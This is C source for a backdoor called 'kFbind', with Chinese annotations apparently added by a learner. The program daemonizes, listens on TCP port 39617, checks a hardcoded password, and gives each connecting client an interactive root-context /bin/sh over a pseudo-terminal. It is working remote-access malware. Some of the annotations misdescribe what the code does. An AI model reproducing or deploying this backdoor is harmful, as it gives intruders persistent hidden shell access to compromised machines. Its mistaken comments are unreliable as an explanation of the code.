#define HOME "/"
#define TIOCSCTTY 0x540E
#define TIOCGWINSZ 0x5413
#define TIOCSWINSZ 0x5414
#define ECHAR 0x1d
#define PORT 39617
#define BUF 32768
 
#include <sys/wait.h>
#include <sys/types.h>
#include <sys/resource.h>
 
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <signal.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <string.h>
#include <fcntl.h>
 
struct winsize {
    unsigned short ws_row;
    unsigned short ws_col;
    unsigned short ws_xpixel;
    unsigned short ws_ypixel;
};
 
/* passwd protection by KillFinger oF SecretColony */
int sc;
char passwd[] = "kF";
char motd[] ="=- SecretColony Lab N Research Project -=\n";

void kf_shell () {
    char buffer[150];
 
    write(sc, "passwd ", 7); //用户在屏幕输入“passwd”，会让用户输入密码，同时系统也会输出相应的东西（刚开始一直没有看懂这个是什么意思？sc根本没有空间，后来直接在我的CentOs上输入了passwd，一下子系统就返回了change usr：，于是想到了，原来这句话是这个用途，感觉只看不自己去做有些东西是很难看出来的，至少对我来说是这样）
    read(sc, buffer, sizeof(buffer));

    //比较这个系统返回的话中是否有 has "kF"（我上网查了一下，网上很多都说kf是游戏服务器）
    if (!strncmp(buffer, passwd, strlen(passwd))) {
        write(sc, motd, sizeof(motd)); //改写密码
    } else {
        write(sc, "DiE!!!\n", 7); //不能操作了
        close(sc); exit(0);
    }
}

/* creates tty/pty name by index */
void get_tty (int num, char *base, char *buf) {
    char series[] = "pqrstuvwxyzabcde";
    char subs[]   = "0123456789abcdef";
    int pos = strlen(base);        //base is tty/pty name 
    strcpy(buf, base);                //pos is name's length
    buf[pos] = series[(num >> 4) & 0xF];
    buf[pos+1] = subs[num & 0xF];
    buf[pos+2] = 0;
}
 
/* search for free pty and open it */
int open_tty (int *tty, int *pty) {
    char buf[512];
    int i, fd;
 
    fd = open("/dev/ptmx", O_RDWR); //write and read open it
    close(fd);
 
    for (i=0; i < 256; i++) {
        get_tty(i, "/dev/pty", buf);            //buf has a path "/dev/pty/XXXX"
        *pty = open(buf, O_RDWR);
        
        if (*pty < 0) {
            continue;
        }

        get_tty(i, "/dev/tty", buf);              //buf has a path "/dev/tty/XXXX"
        *tty = open(buf, O_RDWR);
        
        if (*tty < 0) {
            close(*pty);
            continue;
        }
        
        return 1;
    }

    return 0;
}
 
/* to avoid creating zombies ;) */
void sig_child (int i) {
    signal(SIGCHLD, sig_child);       //when process stop ,begin sig_child function
    waitpid(-1, NULL, WNOHANG);       //suspend process temp
}
 
void hangout (int i) {
    kill(0, SIGHUP);
    kill(0, SIGTERM);                           //终止与当前进程组内的所有进程
}
  
//调用
int main () {
    int pid;
    struct sockaddr_in serv;    
    struct sockaddr_in cli;     
    //struct sockaddr_in  
    {  
        //shortsin_family;            /*Addressfamily一般来说AF_INET（地址族）PF_INET（协议族）*/
        //unsignedshortsin_port;    /*Portnumber(必须要采用网络数据格式,普通数字可以用htons()函数转换成网络数据格式的数字)*/
        //structin_addrsin_addr;    /*Internetaddress*/  
        //unsignedcharsin_zero[8];    /*Samesizeasstructsockaddr没有实际意义,只是为了跟SOCKADDR结构在内存中对齐*/
    // };
    int sock;
    sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);

    if (sock < 0) {
        perror("socket");
        return 1;
    }
 
    bzero((char *) &serv, sizeof(serv));                               //make sizeof(serv) bytes as zero
    serv.sin_family = AF_INET;
    serv.sin_addr.s_addr = htonl(INADDR_ANY);
    serv.sin_port = htons(PORT);

    //将套接字绑定到一个已知的地址上。
    if (bind(sock, (struct sockaddr *) &serv, sizeof(serv)) < 0) {
        perror("bind");
        return 1;
    }
    
    if (listen(sock, 5) < 0) {
        perror("listen");
        return 1;
    }

    printf("kFbind is starting...");
 
    fflush(stdout); //刷新标准输出缓冲区，把输出缓冲区里的东西打印到标准输出设备上
 
    pid = fork();     //create a child process,give child process id
    if (pid !=0 ) {
        printf("OK, pid = %d\n", pid);
        printf("Enj0y y0uR d00r by SecretColony\n");
        return 0;
    }
 
    /* daemonize */
    setsid();                  //当前进程会成为新会话的领头进程，同时与控制终端脱离
    chdir("/");                //改变当前工作目录位"/"
    pid = open("/dev/null", O_RDWR); //开启无底洞
    dup2(pid, 0); //copy file handle
    dup2(pid, 1);
    dup2(pid, 2);
    close(pid);
    signal(SIGHUP, SIG_IGN);     //发送给具有Terminal的Controlling Process，当terminal被disconnect时候发送
    signal(SIGCHLD, sig_child);  //when process stop ,begin sig_child function
    while (1) {
        int scli;
        int slen;
        slen = sizeof(cli);
        scli = accept(sock, (struct sockaddr *) &cli, &slen); //从连接请求队列中获得连接信息，
        //创建新的套接字，并返回该套接字的文件描述符。新创建的套接字用于服务器与客户机的通信，而原来的套接字仍然处于监听状态。
        if (scli < 0) {
            continue;
        }

        pid = fork();   //create a child process,give child process id
        if (pid == 0) {
            int subshell;
            int tty;
            int pty;
            fd_set fds;
            char buf[BUF];
            char *argv[] = {"sh", "-i", NULL};

            #define MAXENV 256
            #define ENVLEN 256

            char *envp[MAXENV];
            char envbuf[(MAXENV+2) * ENVLEN];
            int j, i;
            char home[256];
  
            /* setup enviroment */
            envp[0] = home;
            sprintf(home, "HOME=%s", "/");
            j = 0;
            do {
                    i = read(scli, &envbuf[j * ENVLEN], ENVLEN);
                    envp[j+1] = &envbuf[j * ENVLEN];
                    j++;

                    if ((j >= MAXENV) || (i < ENVLEN)) {
                        break;
                    }
            } while (envbuf[(j-1) * ENVLEN] != '\n'); //直到读到回车为止
 
            envp[j+1] = NULL;
 
            /* create new group */
            setpgid(0, 0);            //目前进程ID将用作进程组ID
 
            /* open slave & master side of tty */
            if (!open_tty(&tty, &pty)) {
                char msg[] = "Can't fork pty, bye!\n"; //还在这幽默呢
                write(scli, msg, strlen(msg));
                close(scli);
                exit(0);
            }
 
            /* fork child */
            subshell = fork();
            
            if (subshell == 0) {
                /* close master */
                close(pty);
                /* attach tty */
                setsid();                        //进程与控制终端脱离
                ioctl(tty, TIOCSCTTY); //可向设备发送控制和配置命令
                /* close local part of connection */
                close(scli);
                close(sock);
                signal(SIGHUP, SIG_DFL); //发送给具有Terminal的Controlling Process，当terminal被disconnect时候发送
                                                                //SIG_DFL 这个符号表示恢复系统对信号的默认处理
                signal(SIGCHLD, SIG_DFL); //when process stop
                dup2(tty, 0);
                dup2(tty, 1);
                dup2(tty, 2);
                close(tty);
                kf_shell();
                execve("/bin/sh", argv, envp);
                //execve()用来执行参数filename字符串所代表的文件路径，
                //第二个参数是利用数组指针来传递给执行文件，并且需要以空指针(NULL)结束，
                //最后一个参数则为传递给执行文件的新环境变量数组。
                //就像上面那样
                //char *argv[] = {"sh", "-i", NULL}; 
                //envp包含scli的东西
                //scli = accept(sock, (struct sockaddr *) &cli, &slen); //从连接请求队列中获得连接信息，
            }
            /* close slave */
            close(tty);
 
            signal(SIGHUP, hangout);
            signal(SIGTERM, hangout); //发送终止信号时启用handout
 
            while (1) {
                /* watch tty and client side */
                FD_ZERO(&fds);      //初始化套接字
                FD_SET(pty, &fds);  //将pty加入fds集合
                FD_SET(scli, &fds); //将scli加入fds集合

                if (select((pty > scli) ? (pty+1) : (scli+1), &fds, NULL, NULL, NULL) < 0) {
                    break;
                }

                if (FD_ISSET(pty, &fds)) {
                    int count;
                    count = read(pty, buf, BUF);

                    if (count <= 0) {
                        break;
                    }

                    if (write(scli, buf, count) <= 0) {
                        break;
                    }
                }

                if (FD_ISSET(scli, &fds)) {
                    int count;
                    unsigned char *p, *d;
                    d = buf;
                    count = read(scli, buf, BUF);
                    
                    if (count <= 0) {
                        break;
                    }
 
                    /* setup win size */
                    p = memchr(buf, ECHAR, count); //从buf所指内存区域的前count个字节查找字符ECHAR。
                    
                    if (p) {
                        unsigned char wb[5];
                        int rlen = count - ((ulong)p - (ulong)buf);
                        struct winsize ws;
 
                        /* wait for rest */
                        if (rlen > 5){
                            rlen = 5;
                        }
                        
                        memcpy(wb, p, rlen);
                        
                        if (rlen < 5) {
                            read(scli, &wb[rlen], 5 - rlen);
                        }
 
                        /* setup window */
                        ws.ws_xpixel = ws.ws_ypixel = 0;
                        ws.ws_col = (wb[1] << 8) + wb[2];
                        ws.ws_row = (wb[3] << 8) + wb[4];
                        ioctl(pty, TIOCSWINSZ, &ws); //可向设备发送控制和配置指令了
                        kill(0, SIGWINCH);
 
                        /* write the rest */
                        write(pty, buf, (ulong) p - (ulong) buf);
                        rlen = ((ulong) buf + count) - ((ulong)p+5);
                        if (rlen > 0) {
                            write(pty, p+5, rlen);
                        }
                    } else if (write(pty, d, count) <= 0)
                        break;
                    }
                }

                close(scli);
                close(sock);
                close(pty);
                waitpid(subshell, NULL, 0); //暂时停止目前进程的执行，直到有信号来到或子进程结束。
                vhangup(); //将当前进程挂起
                exit(0);
            }

            close(scli);
        }
}